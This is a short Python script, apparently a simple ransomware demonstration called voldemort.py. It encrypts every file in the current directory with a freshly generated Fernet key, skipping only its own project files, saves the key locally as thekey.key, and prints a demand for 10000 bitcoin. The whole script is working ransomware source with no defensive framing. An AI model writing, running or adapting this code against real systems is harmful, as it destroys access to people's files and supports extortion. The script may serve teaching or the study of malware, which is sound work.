#!/usr/bin/env python3


import os
from cryptography.fernet import Fernet


#let's find some files


files = []


for file in os.listdir():
	if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py" or file == "README.md" or file == "LICENSE":
		continue
	if os.path.isfile(file):
		files.append(file)


print(files)



key = Fernet.generate_key()


with open("thekey.key", "wb") as thekey:
	thekey.write(key)



for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb")as thefile:
		thefile.write(contents_encrypted)



print ("all of your files have been encrypted. Send me 10000 bitcoin now.")
